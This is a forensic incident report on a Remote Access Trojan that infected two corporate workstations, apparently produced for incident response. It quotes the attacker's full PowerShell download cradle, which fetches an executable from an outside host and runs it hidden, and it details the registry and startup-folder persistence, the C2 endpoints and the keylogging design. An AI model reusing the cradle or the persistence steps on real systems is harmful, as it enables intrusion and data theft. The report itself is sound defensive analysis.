# Incident Analysis Report

## Executive Summary

A sophisticated Remote Access Trojan (RAT) was deployed on the corporate network, affecting at least two workstations (`anders-desktop` and `john-desktop`). The malware establishes persistent access, implements keylogging and clipboard monitoring capabilities, and exfiltrates sensitive data to attacker-controlled command and control (C2) servers.

---

## Timeline Summary

### Attack Timeline

| Time (UTC) | Event | Evidence Source |
|------------|-------|-----------------|
| 17:46:55 | Initial infection via PowerShell download cradle | Endpoint Process Logs |
| 17:47:11 | Malware binary `updater.exe` dropped in Temp folder | Endpoint File Logs |
| 17:47:20 | Malware executed, self-installed to `AppData\Local\Microsoft\` | Endpoint Process Logs |
| 17:47:21 | Persistence established via Registry Run key and Startup folder | Endpoint Registry/File Logs |
| 17:47:19 | Initial C2 beacon with system information | HTTP Network Logs |
| 17:47:49 | First command retrieval from C2 | HTTP Network Logs |
| 17:48:20 | Encrypted command received (likely reconnaissance) | HTTP Network Logs |
| 17:49:12 | Secondary infection on john-desktop | Endpoint Process Logs |
| 17:49:22 | Directory enumeration of Documents folder | Endpoint Process Logs |
| 17:50:53 | Directory enumeration of Desktop folder | Endpoint Process Logs |
| 17:51:53 | **Sensitive file accessed: `polen.eml`** | Endpoint Process Logs |
| 17:51:50 | Large encrypted data exfiltration | HTTP Network Logs |
| 17:52:28 - 17:53:07 | Multiple data exfiltration events | HTTP Network Logs |

---

## Motivation

The attacker's motivation appears to be **corporate espionage and data theft**:

1. **Reconnaissance-focused**: The malware performed systematic directory enumeration of user folders (Documents, Desktop)
2. **Email targeting**: Specific targeting of `.eml` files suggests interest in email communications
3. **Long-term persistence**: Multiple persistence mechanisms indicate intent for extended access
4. **Data exfiltration**: Large volumes of encrypted data were transmitted to C2 servers

---

## Attack Vector

### Initial Access
The attacker used a **PowerShell download cradle** to deliver the payload:

```powershell
PowerShell.exe -exec bypass -windowstyle hidden -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"
```

**Key techniques:**
- `-exec bypass`: Bypasses PowerShell execution policy
- `-windowstyle hidden`: Executes without visible window
- `ServerCertificateValidationCallback={$true}`: Disables SSL certificate validation
- `IWR` (Invoke-WebRequest): Downloads payload from `f1leshare.net`

### Malware Installation
Upon execution, the malware (`FUN_140002e83`):
1. Copies itself to `%APPDATA%\Microsoft\updater.exe`
2. Creates copy in Startup folder as `msteamsupdater.exe` (masquerading as Microsoft Teams)
3. Creates Registry Run key for persistence
4. Creates scheduled task cache entry

---

## Impact

### Compromised Assets
- **Hosts**: `anders-desktop` (10.3.10.21), `john-desktop` (10.3.10.22)
- **Users**: `anders`, `john`
- **Data Accessed**: Email files, documents, clipboard contents, keystrokes

### Exfiltrated Data
Based on network traffic analysis, the following was exfiltrated:

1. **System Information** (17:47:19):
   ```
   Host: ANDERS-DESKTOP
   User: anders
   Arch: x64
   CPUs: 4
   RAM: 8185 MB
   ```

2. **File Content** (17:51:53): 
   - Email file `C:\Users\anders\Desktop\polen.eml` was accessed and likely exfiltrated

3. **Keylogger Data** (17:52:28 - 17:53:07):
   - Multiple encrypted payloads sent to `/api/data`
   - Window titles and keystrokes captured

4. **Clipboard Data**:
   - Clipboard monitoring active (function `FUN_140001fe4`)
   - Data exfiltrated when clipboard changes detected

---

## Malware Capabilities (Reverse Engineering Analysis)

### Core Functions Identified

| Function | Address | Capability |
|----------|---------|------------|
| `FUN_140003233` | 140003233 | Main execution loop |
| `FUN_140002e83` | 140002e83 | Persistence installation |
| `FUN_14000221a` | 14000221a | Self-deletion/cleanup |
| `FUN_140001eb5` | 140001eb5 | Get active window title |
| `FUN_140001f13` | 140001f13 | Clipboard data retrieval |
| `FUN_140001fe4` | 140001fe4 | Clipboard monitoring |
| `FUN_140001b8c` | 140001b8c | AES encryption (ECB mode) |
| `FUN_1400017b0` | 1400017b0 | HTTP exfiltration to MiccosoftUpdate.com |
| `FUN_1400018e7` | 1400018e7 | HTTP exfiltration to windowsupdater.tk |
| `FUN_140001df3` | 140001df3 | Encrypt and exfiltrate data |

### Keylogging Implementation
The malware implements a polling-based keylogger (`FUN_140003233`):
- Polls keyboard state every 100ms using `GetAsyncKeyState()`
- Captures alphanumeric keys, special characters, space, enter, tab, backspace
- Tracks active window changes using `GetForegroundWindow()`
- Formats output as `[WINDOW: <title>]` followed by keystrokes

### Encryption
- **Algorithm**: AES-128-ECB
- **Key Derivation**: First 16 characters of hostname (padded with null bytes)
- **Key for anders-desktop**: `ANDERS-DESKTOP\x00\x00`
- **Encoding**: Base64 after encryption

### C2 Communication
**Primary C2 (Data Exfiltration)**:
- Domain: `MiccosoftUpdate.com` (typosquatting Microsoft)
- IP: `10.3.97.182`
- Port: 80 (HTTP)
- Endpoints: `/api/info`, `/api/data`

**Secondary C2 (Command & Control)**:
- Domain: `windowsupdater.tk`
- IP: `10.3.215.83`
- Port: 80 (HTTP)
- Endpoints: `/windows/checkforupdate`, `/update/servicedata`

**User-Agent**: `Mozilla/5.0`

### Persistence Mechanisms
1. **Registry Run Key**:
   - Path: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`
   - Value: `C:\Users\<user>\AppData\Local\Microsoft\updater.exe`

2. **Startup Folder**:
   - Path: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`

3. **Scheduled Task**:
   - Registry entry created in TaskCache

4. **Mutex**:
   - Name: `Global\MicrosoftUpdateMutex`
   - Prevents multiple instances

---

## Indicators of Compromise (IOCs)

### File Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `updater.exe` | Filename | Primary malware binary |
| `msteamsupdater.exe` | Filename | Startup persistence copy |
| `C:\Users\*\AppData\Local\Temp\updater.exe` | Path | Initial drop location |
| `C:\Users\*\AppData\Local\Microsoft\updater.exe` | Path | Installation location |
| `C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe` | Path | Startup persistence |

### Network Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `f1leshare.net` | Domain | Payload download server |
| `MiccosoftUpdate.com` | Domain | Primary C2 (data exfiltration) |
| `windowsupdater.tk` | Domain | Secondary C2 (command retrieval) |
| `10.3.97.182` | IP | MiccosoftUpdate.com resolved IP |
| `10.3.215.83` | IP | windowsupdater.tk resolved IP |
| `/api/info` | URI Path | System info submission |
| `/api/data` | URI Path | Data exfiltration endpoint |
| `/windows/checkforupdate` | URI Path | Command polling endpoint |
| `/update/servicedata` | URI Path | Alternative exfiltration endpoint |
| `Mozilla/5.0` | User-Agent | HTTP client identifier |

### Registry Indicators

| Indicator | Path | Description |
|-----------|------|-------------|
| `MicrosoftUpdater` | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Persistence key |
| `MicrosoftUpdater` | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree` | Task persistence |

### Mutex Indicators

| Indicator | Description |
|-----------|-------------|
| `Global\MicrosoftUpdateMutex` | Instance mutex |

### Behavioral Indicators

- PowerShell execution with `-exec bypass` and `IWR` commands
- HTTP POST requests with `Content-Type: application/octet-stream`
- Base64-encoded encrypted data in HTTP bodies
- Regular polling to `/windows/checkforupdate` every ~30 seconds

---

## Encrypted Commands Received

The following encrypted commands were received from the C2 server:

1. `Q52aB5TFVA5uEM/IeZ0Kyg==` (17:48:20)
2. `ISL6QPPTKg2tMQgQfCRu10uFvjw0koh/MudkA/oUS98=` (17:49:20)
3. `ISL6QPPTKg2tMQgQfCRu134S+r4B5p6X4HZo/X4d/vs=` (17:50:50)
4. `A45yK3lKmkrMpH01AxtchDAHsYTB95vlGUdgdYR6EekutR6WwKdtMbvDbfUfwsKt` (17:51:50)

**Note**: Commands are AES-128-ECB encrypted with key derived from hostname. Decryption attempts indicate these likely contain shell commands executed via `cmd.exe /c`.

---

## Evidence Correlation

### Cross-Tool Validation

| Finding | Ghidra Evidence | Elasticsearch Evidence |
|---------|-----------------|------------------------|
| C2 Domain `MiccosoftUpdate.com` | String at 0x14001300c | HTTP logs to domain |
| C2 Domain `windowsupdater.tk` | String at 0x140013059 | HTTP logs to domain |
| Endpoint `/api/data` | String at 0x14001306b | POST requests observed |
| Endpoint `/windows/checkforupdate` | String at 0x140013141 | GET requests observed |
| Registry persistence | `FUN_140002e83` creates Run key | Registry modification logs |
| Keylogging | `FUN_140003233` polls keystrokes | N/A (in-memory activity) |
| Clipboard monitoring | `FUN_140001fe4` monitors clipboard | N/A (in-memory activity) |
| AES encryption | `FUN_140001b8c` uses BCrypt AES | Encrypted payloads in HTTP |
| Mutex creation | String `Global\MicrosoftUpdateMutex` | Would appear in handle logs |

---

## Recommendations

### Immediate Actions
1. **Isolate affected hosts**: Disconnect `anders-desktop` and `john-desktop` from network
2. **Block IOCs**: Block all identified domains and IPs at firewall/proxy
3. **Kill processes**: Terminate `updater.exe` and `msteamsupdater.exe` processes
4. **Remove persistence**: Delete Registry Run keys and Startup folder entries
5. **Delete files**: Remove malware binaries from all locations

### Forensic Preservation
1. **Memory dumps**: Capture RAM from affected systems before remediation
2. **Disk images**: Create forensic images of affected workstations
3. **Network logs**: Preserve proxy/firewall logs for extended analysis
4. **Email recovery**: Attempt recovery of `polen.eml` to determine sensitivity

### Long-term Improvements
1. **PowerShell logging**: Enable Script Block Logging and Module Logging
2. **Application whitelisting**: Prevent execution of unsigned binaries
3. **Network segmentation**: Implement micro-segmentation to limit lateral movement
4. **Email security**: Review how initial compromise occurred (phishing suspected)
5. **User training**: Security awareness training to recognize suspicious PowerShell commands

---

## Conclusion

This incident represents a targeted cyber espionage operation using a custom-built Remote Access Trojan. The attacker demonstrated sophistication through:

- Multi-stage payload delivery via PowerShell
- Typosquatting of legitimate Microsoft domains
- Strong encryption for C2 communications
- Multiple persistence mechanisms
- Masquerading as legitimate Microsoft applications

The attack was detected during the data exfiltration phase, but not before sensitive email data was likely compromised. Immediate containment and thorough forensic analysis are critical to prevent further damage and identify the full scope of the compromise.

---

## Appendix: Raw Evidence Samples

### HTTP Exfiltration Sample (17:52:40)
```
Destination: MiccosoftUpdate.com (10.3.97.182)
Endpoint: /api/data
Request Body (encrypted): AUdGz12wy0suSXCncEyqOO5cFEC/80wWqrGnvdS0qUlFS/lJ...
Response: {"status":"ok"}
```

### Command Retrieval Sample (17:51:50)
```
Destination: windowsupdater.tk (10.3.215.83)
Endpoint: /windows/checkforupdate
Request Body: Host: ANDERS-DESKTOP
Response: {"command":"A45yK3lKmkrMpH01AxtchDAHsYTB95vlGUdgdYR6EekutR6WwKdtMbvDbfUfwsKt","encrypted":"True","status":"ok"}
```

### Process Execution Chain
```
powershell.exe (parent)
  └── updater.exe (child)
       └── cmd.exe /c type "C:\Users\anders\Desktop\polen.eml" (grandchild)
```

---

*Report generated: 2026-04-26*
*Analysis tools: Ghidra (reverse engineering), Elasticsearch (log analysis)*
